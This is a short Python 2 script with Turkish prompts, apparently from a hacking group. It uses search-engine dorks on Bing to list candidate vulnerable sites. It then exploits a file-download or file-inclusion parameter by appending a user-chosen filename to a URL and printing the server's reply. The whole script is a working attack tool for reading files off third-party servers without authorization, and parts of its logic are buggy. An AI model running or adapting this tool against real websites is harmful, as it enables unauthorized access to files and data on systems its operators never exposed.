import mechanize
import requests
import re
import time
import sys
from colorama import Fore, Back, Style, init
red     = Fore.RED
cyan    = Fore.CYAN
blue    = Fore.BLUE
green   = Fore.GREEN
white   = Fore.WHITE
yellow  = Fore.YELLOW
magenta = Fore.MAGENTA
bright  = Style.BRIGHT
links = []
link_error = ["File extension is forbidden",
              "Error - wrong file extension.",
              ]
def site_tara(dork, page):
    userAgent = {
    	'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7'
        }
    say = 1
    while (say < page):
        
        
        requ = ('http://www.bing.com/search?q=' + dork + '&first='+str(say))
        try:
            r = requests.get(requ, verify=False)
        except Exception:
            print red + "[-]Baglanti basarisiz: "
        req = ''
        try:
            link = re.findall('<h2><a href="(.+?)"', r.text)
            for i in range(len(link)):
                        
                    if link[i].find('http://bs.yandex.ru'):
                        if link[i] not in links:
                            links.append(link[i])
                            print link[i]
        except: raise
print green + "Hackno tum tht ailesine iyi gunler diler (:"
print yellow + "Url'yi 'www.example.com/file=' seklinde girin"
print yellow + "eger url adresiniz yoksa bos birakin 'dork' yazin. Daha sonra dorkunuzu girin. sizin icin cikan siteleri siralayabilirim."

url = raw_input(bright + yellow + "[*]Url: ")
if url == "dork":
    dork = raw_input(bright+yellow+"[*]Dork: ")
    site_tara(dork, 10)
else:
    while True:
        iFile = raw_input(bright+yellow+"[*]Indirmek istediginiz dosya adini girin: ")
        yeni_url = url + iFile
        session = requests.Session()
        ac = session.post(yeni_url)
        for i in link_error:
            if i == ac.content:
                print red + "[-]Acik yok veya yanlis bir dosya girdiniz. Tekrar deneyin"
                sys.exit()
            else:
                pass
        print ac.content
